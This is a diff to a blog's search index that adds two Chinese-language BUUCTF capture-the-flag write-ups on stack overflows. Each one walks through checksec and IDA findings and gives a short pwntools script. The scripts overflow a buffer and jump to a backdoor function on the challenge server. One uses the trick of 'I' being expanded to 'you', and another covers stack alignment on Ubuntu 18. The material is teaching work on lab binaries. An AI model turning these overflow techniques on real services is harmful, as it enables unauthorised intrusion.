@@ -4,6 +4,72 @@
   
     
     <entry>
+      <title>PWN-ret2text-3</title>
+      <link href="/2025/01/15/buuctfpwn2/"/>
+      <url>/2025/01/15/buuctfpwn2/</url>
+      
+        <content type="html"><![CDATA[<p>来源BUUCTF</p><h1 id="检查安全设置和类型"><a href="#检查安全设置和类型" class="headerlink" title="检查安全设置和类型"></a>检查安全设置和类型</h1><p>拿到先放到checksec里面检查安全设置和类型，发现保护较为薄弱，并且是64位小端序</p><h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>静态分发现是一个很简单的栈溢出，payload如下，这里主要介绍堆栈平衡的特性（ubuntu18后的新特性）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment">#io=process('pwn1')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">27824</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>cyclic<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401187</span><span class="token punctuation">)</span>  <span class="token comment"># 直接跳转到后门函数的第二行（第一行地址为0x401186，汇编为push，对堆栈平衡有影响，所以跳到第二行）</span><span class="token comment">#payload=cyclic(0xf+0x8) + p64(0x401185)+p64(0x401186)   先跳到任意一个ret汇编语句，然后跟上后门函数地址（第一行）</span>遇到ubuntu18及以上的环境时需要考虑堆栈平衡，可以选用以上任意一种方法来平衡io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 竞赛 </category>
+          
+          <category> CTF </category>
+          
+          <category> PWN </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+            <tag> BUUCTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PWN-ret2text-2</title>
+      <link href="/2025/01/14/buuctfpwn1/"/>
+      <url>/2025/01/14/buuctfpwn1/</url>
+      
+        <content type="html"><![CDATA[<p>来源BUUCTF</p><h1 id="检查安全设置和类型"><a href="#检查安全设置和类型" class="headerlink" title="检查安全设置和类型"></a>检查安全设置和类型</h1><p>拿到先放到checksec里面检查安全设置和类型，发现保护较为薄弱，并且是32位小端序</p><h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p><img src="/images/buuctfpwn1/1.JPG"><br>在IDA中查看vuln函数，发现我们只能输入32字节大小的字符（s只有32字节），而覆盖栈需要0x3C个字符，显然是没法溢出的，仔细观察，看到大写I和小写you，经过猜测和测试发现当我们给程序输入一个大写I，程序会将其替换为you，这样我们就可以构造足够的字符来溢出了，下面给出payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment">#io=process('./pwn1_sctf_2016')    # 本地打通</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28285</span><span class="token punctuation">)</span>  <span class="token comment"># 远程打通</span>payload<span class="token operator">=</span><span class="token string">b'I'</span><span class="token operator">*</span><span class="token number">21</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x8048F0E</span><span class="token punctuation">)</span> <span class="token comment"># 需要64个字符来填满，21个I能换63个字符加一个a，后面是后门函数地址</span><span class="token comment">#io.recvline()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 竞赛 </category>
+          
+          <category> CTF </category>
+          
+          <category> PWN </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+            <tag> BUUCTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>OSCP-Intermediate-symfonos_5</title>
       <link href="/2025/01/12/OSCP-symfonos5/"/>
       <url>/2025/01/12/OSCP-symfonos5/</url>
@@ -144,40 +210,7 @@
     
     
     <entry>
-      <title>PWN-StackOverflow2</title>
-      <link href="/2024/12/20/buuctfpwn1/"/>
-      <url>/2024/12/20/buuctfpwn1/</url>
-      
-        <content type="html"><![CDATA[<p>来源BUUCTF</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 竞赛 </category>
-          
-          <category> CTF </category>
-          
-          <category> PWN </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> PWN </tag>
-            
-            <tag> CTFshow </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>PWN-StackOverflow</title>
+      <title>PWN-ret2text-1</title>
       <link href="/2024/12/20/ctfshowpwn02/"/>
       <url>/2024/12/20/ctfshowpwn02/</url>
       
